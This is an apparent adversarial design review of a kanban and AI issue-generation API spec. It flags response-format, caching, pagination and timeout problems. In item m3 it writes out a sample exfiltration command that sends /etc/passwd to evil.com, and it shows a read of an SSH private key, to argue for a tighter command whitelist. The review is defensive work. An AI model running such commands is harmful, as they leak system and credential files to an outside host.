# Phase 3 API Specification - Adversarial Review (Round 1)

**Reviewer**: Backend Architect  
**Date**: 2026-05-21  
**Spec Version**: api-specification.md (Phase 3: Kanban & AI Issue Generation)  
**Overall Assessment**: **PASS WITH CHANGES**

The spec is well-structured and thorough. However, there are several inconsistencies with the existing implementation, a security gap, and some design issues that must be resolved before implementation begins.

---

## Critical Issues

### C1. Response format inconsistency: `showType` serialization behavior

**Section**: "统一响应格式" + all Response Wrapper schemas  
**Severity**: Critical

The spec declares `showType` as a required field (always present in examples). However, the existing `ResponseData` struct in `web-platform/src/models/response.rs` uses `#[serde(skip_serializing_if = "Option::is_none")]` on `show_type`, meaning successful responses **omit** `showType` entirely (it's `None` on success).

The spec shows `"showType": 0` in all success responses. The existing implementation will not produce this field on success.

**Fix**: Either:
- (a) Update the spec to state `showType` is only present on error responses (matching current behavior), OR
- (b) Change the existing `ResponseData` to always emit `showType` (breaking change for Phase 1/2 clients).

Option (a) is strongly recommended to avoid a breaking change.

---

### C2. Success response `retMsg` mismatch

**Section**: All success response examples  
**Severity**: Critical

The spec shows `"retMsg": "success"` in all success responses. The existing implementation uses `"retMsg": "ok"` (see `response.rs` line 23: `ret_msg: "ok".to_string()`).

This is a contract inconsistency. Frontend code that checks `retMsg` value will break depending on which convention is followed.

**Fix**: Align the spec to use `"ok"` to match the existing implementation, or document that Phase 3 will use `"success"` and update Phase 1/2 for consistency. The former is safer.

---

### C3. `POST /issues` returns 200 instead of 201

**Section**: "POST /api/projects/{id}/issues" responses  
**Severity**: Critical

Creating a resource should return HTTP 201 Created, not 200 OK. The existing `create_project` handler also returns 200 (so there's precedent), but this is a REST anti-pattern that should be corrected now rather than propagated.

**Fix**: Change the success response to `201` with the same body. If maintaining consistency with Phase 1/2 is prioritized, document this as a known deviation from REST conventions and keep 200.

---

## Major Issues

### M1. Field naming convention conflict with existing code

**Section**: "字段命名约定"  
**Severity**: Major

The spec states: "业务实体字段使用 snake_case：`issue_iid`, `merge_request`, `created_at`"

However, the existing `ProjectResponse` struct in `handlers/projects.rs` uses `#[serde(rename_all = "camelCase")]`, meaning all project entity fields are serialized as camelCase (`gitUrl`, `platformHost`, `createdAt`, etc.).

This creates an inconsistency: Phase 1/2 entities use camelCase, Phase 3 entities use snake_case. Frontend developers will need to handle two different naming conventions for different API endpoints.

**Fix**: Either:
- (a) Use camelCase for Phase 3 entity fields too (consistent with existing code), OR
- (b) Explicitly document this as a deliberate divergence and explain why (e.g., "Phase 3 proxies external API data and preserves their field names").

Option (b) is defensible since the data originates from GitLab/GitHub APIs which use snake_case, but it must be explicitly called out as a design decision, not left ambiguous.

---

### M2. Error `showType` is hardcoded to 2 in existing implementation

**Section**: Error codes table  
**Severity**: Major

The spec defines different `showType` values per error code (e.g., AUTH_001 = 9, BIZ_001 = 1, EXT_001 = 4). However, the existing `error.rs` implementation hardcodes `"showType": 2` for ALL error responses (line 69).

Phase 3 implementation will need to refactor the error handling to support per-error-code `showType` values, which is a cross-cutting change affecting Phase 1/2 behavior.

**Fix**: Document this as a prerequisite refactoring task. The `WebPlatformError` enum needs to carry `showType` information, or the `IntoResponse` impl needs a mapping table.

---

### M3. Missing authorization model for kanban data isolation

**Section**: "GET /api/projects/{id}/kanban" business rules  
**Severity**: Major

The spec says "需要项目成员权限或 admin" but does not address a subtle security issue: the kanban data is fetched using the **requesting user's** GitLab/GitHub token. This means:

1. User A (project member) sees issues visible to their token's permissions on GitLab.
2. User B (also project member) may see different issues if their token has different GitLab permissions.

This is probably intentional (each user sees what they have access to), but it's not documented. More critically: what happens if an admin user has no GitLab token configured? The spec says return BIZ_001, but an admin might expect to see the kanban without configuring a token.

**Fix**: Explicitly document that admin users still need a platform token to view kanban data. Add a note that different users may see different data based on their token's permissions on the external platform.

---

### M4. Cache key design leaks data between filter combinations

**Section**: "缓存键设计"  
**Severity**: Major

The cache key example shows `5:1:kanban:abc123` where `abc123` is a query params hash. However, the kanban endpoint has multiple filter parameters (`todo_limit`, `assignee`, `labels`, `search`). If a user requests the kanban with `labels=bug` and then without any filter, they'll get different cached results, which is correct.

But the singleflight design means if User A requests `kanban?labels=bug` and User B requests `kanban?labels=bug` simultaneously, they'll share the same external API call. Since the cache key includes `user_id`, this sharing won't happen across users. This is correct but means **no singleflight benefit across users** — the primary benefit is only for a single user's rapid repeated requests (e.g., React StrictMode double-render).

**Fix**: Document that singleflight is per-user, not global. If cross-user singleflight is desired (for teams viewing the same project), the design needs a shared service token approach, which has different security implications.

---

### M5. `in_progress` column has no pagination but no upper bound guarantee

**Section**: KanbanData schema, "处理中列返回全部（通常数量有限）"  
**Severity**: Major

The spec assumes "处理中" issues are "通常数量有限" but provides no safeguard. A project with aggressive automation could have 50+ issues with `symphony-claimed` label simultaneously. Without a limit, the response payload could become very large, and the backend would make unbounded GitLab API calls (GitLab paginates at 100/page).

**Fix**: Add a `in_progress_limit` parameter with a default of 100 and a `has_more` field (matching the `todo` column pattern). Alternatively, document a hard cap (e.g., max 200) and return an error or truncation warning if exceeded.

---

### M6. PR column N+1 query risk

**Section**: Kanban endpoint, PR column description  
**Severity**: Major

The spec says: "PR 列返回与处理中 issues 关联的所有 MR/PR". This means for N in-progress issues, the backend must make N separate API calls to fetch related MRs (one per issue: `GET /projects/:id/issues/:iid/related_merge_requests`).

With 10 in-progress issues, that's 10 external API calls per kanban request. With singleflight this is mitigated for repeated requests, but the first request will be slow.

**Fix**: Document the expected latency impact. Consider:
- Parallel execution of MR-fetch calls (with a concurrency limit)
- A note in the spec about expected response time (e.g., "first request may take 2-5s depending on in-progress issue count")
- A `include_prs=true` query parameter to make PR fetching optional

---

### M7. No timeout specification for external API calls

**Section**: Cache architecture, GitLab/GitHub abstraction  
**Severity**: Major

The spec mentions "60 秒无数据则服务端关闭连接" for SSE, but does not specify timeouts for GitLab/GitHub API calls. If GitLab is slow (10+ seconds), the kanban endpoint will hang.

**Fix**: Specify per-call timeouts for external APIs (recommend 10s per call, 30s total for the kanban endpoint). Document the behavior when a timeout occurs (return partial data? return EXT_001?).

---

## Minor Issues

### m1. `EXT_002` error code semantics overloaded

**Section**: Error codes table + rate limiting section  
**Severity**: Minor

`EXT_002` is defined as "AI 生成速率限制" but is also used for the general rate limit response (HTTP 429). The rate limit on `GET /kanban` (30/min) would also return 429, but the spec doesn't specify which `retCode` to use for non-AI rate limits.

**Fix**: Define a separate error code for general rate limiting (e.g., `SYS_002` or `RATE_001`) or clarify that `EXT_002` applies to all rate limits.

---

### m2. SSE `done` event includes full content redundantly

**Section**: SSEDoneEvent schema  
**Severity**: Minor

The `done` event includes the complete generated content (all chunks concatenated). This doubles the data transfer for the final event. For a 4096-token generation, this could be 8-16KB of redundant data.

**Fix**: Consider making `content` in the `done` event optional. The frontend already accumulates chunks. The full content is useful as a checksum/verification, but document this tradeoff. Alternatively, include only a `token_count` or `checksum` field in the `done` event.

---

### m3. Validation command whitelist includes dangerous commands

**Section**: "Validation 命令白名单"  
**Severity**: Minor (but borderline Major)

The whitelist includes `curl` and `cat`. While these seem innocuous:
- `curl` can exfiltrate data: `curl https://evil.com/steal?data=$(cat /etc/passwd)`
- `cat` can read sensitive files: `cat ~/.ssh/id_rsa`

These commands are only in AI-generated *documentation* (not executed), but if a developer copy-pastes validation commands without review, there's risk.

**Fix**: Remove `curl` and `cat` from the whitelist, or add a prominent warning that validation commands are suggestions only and must be reviewed before execution. Consider restricting `curl` to `curl localhost` or `curl http://localhost`.

---

### m4. Missing `Cache-Control: no-cache` header documentation for force-refresh

**Section**: "缓存失效"  
**Severity**: Minor

The spec mentions "用户可通过前端'刷新'按钮强制绕过缓存（请求头 `Cache-Control: no-cache`）" but this is not documented in the OpenAPI parameters section of the kanban endpoint. Frontend developers won't know about this unless they read the cache architecture section.

**Fix**: Add a `Cache-Control` header parameter to the kanban endpoint's OpenAPI definition, or add a `force_refresh` query parameter (simpler for frontend developers).

---

### m5. `PaginationData` struct mismatch

**Section**: Kanban response structure  
**Severity**: Minor

The existing `PaginationData` struct uses fields: `limit`, `offset`, `pageNo`, `pageSize`, `pages`, `records`, `totalCount`. The kanban response uses a completely different pagination pattern (`total_count`, `has_more`, inline `issues` array).

This is acceptable since kanban isn't a traditional paginated list, but it means the frontend needs two different pagination handling patterns.

**Fix**: Document this as intentional. The kanban uses cursor-style "load more" rather than page-based pagination.

---

### m6. No specification for handling revoked/expired platform tokens

**Section**: All endpoints using user tokens  
**Severity**: Minor

If a user's GitLab token is revoked or expired, the GitLab API will return 401. The spec maps this to `EXT_001` (502), but the user needs actionable guidance — they need to update their token, not "try again later".

**Fix**: Distinguish between "external service down" (EXT_001, retry later) and "user token invalid" (BIZ_001, update your token). When GitLab returns 401/403, return BIZ_001 with a message like "GitLab Token 无效或已过期，请在个人设置中更新".

---

### m7. `AUTH_003` exists in implementation but not in spec

**Section**: Error codes table  
**Severity**: Minor

The existing `error.rs` defines `AUTH_003` for "Invalid username or password" (line 42). The Phase 3 spec's error code table doesn't include this, creating an incomplete error code registry.

**Fix**: Add `AUTH_003` to the error codes table for completeness, even if Phase 3 doesn't use it directly.

---

## Suggestions

### S1. Add an `event: ` field to SSE events

**Section**: SSE protocol  
**Severity**: Suggestion

The SSE spec supports named events via `event: chunk\ndata: {...}\n\n`. Using named events allows the browser's `EventSource` API to dispatch to specific handlers. While the spec notes that `EventSource` doesn't support POST (requiring fetch + ReadableStream), named events are still useful for clarity and future compatibility.

**Fix**: Consider adding `event: chunk`, `event: done`, `event: error` lines before each `data:` line. This is optional but improves protocol clarity.

---

### S2. Add request ID for tracing

**Section**: All endpoints  
**Severity**: Suggestion

For debugging production issues (especially with external API calls that may fail intermittently), a request ID header (`X-Request-Id`) would help correlate frontend errors with backend logs.

**Fix**: Add `X-Request-Id` response header to all endpoints. Include it in error responses so users can report it for support.

---

### S3. Consider WebSocket for real-time kanban updates

**Section**: Kanban endpoint  
**Severity**: Suggestion

The current design requires polling (or manual refresh) to see kanban updates. For a collaborative team environment, WebSocket push notifications when issues move between columns would improve UX significantly.

**Fix**: Not required for Phase 3 MVP, but note it as a future enhancement. The cache invalidation event (after issue creation) could trigger a WebSocket notification to other team members viewing the same project's kanban.

---

### S4. Document the `symphony-claimed` label lifecycle

**Section**: Kanban column definitions  
**Severity**: Suggestion

The spec references `symphony-claimed` label as the divider between "todo" and "in_progress" columns, but doesn't document:
- Who/what adds this label? (Symphony bot when it starts working?)
- Who/what removes it? (When the PR is merged? When the issue is closed?)
- What if a user manually adds/removes it?

**Fix**: Add a brief lifecycle description or reference the relevant Symphony documentation.

---

### S5. Add `updated_since` parameter to kanban endpoint

**Section**: Kanban endpoint parameters  
**Severity**: Suggestion

For efficient polling, an `updated_since` parameter (ISO 8601 timestamp) would allow the frontend to fetch only issues updated since the last request, reducing payload size for subsequent requests.

---

## Summary

| Severity | Count | Must fix before implementation? |
|----------|-------|-------------------------------|
| Critical | 3 | Yes |
| Major | 7 | Yes (or document as accepted risk) |
| Minor | 7 | Recommended |
| Suggestion | 5 | Optional |

The three critical issues (C1, C2, C3) are straightforward to fix — they're alignment issues with the existing codebase. The major issues require design decisions (M1 naming convention, M5/M6 pagination/performance) that should be resolved before implementation begins.

The spec is otherwise well-designed: the SSE protocol is correctly specified, the cache architecture is sound for its stated purpose, and the security measures for AI prompt injection are reasonable. The error handling is comprehensive and the OpenAPI schema is detailed enough for code generation.
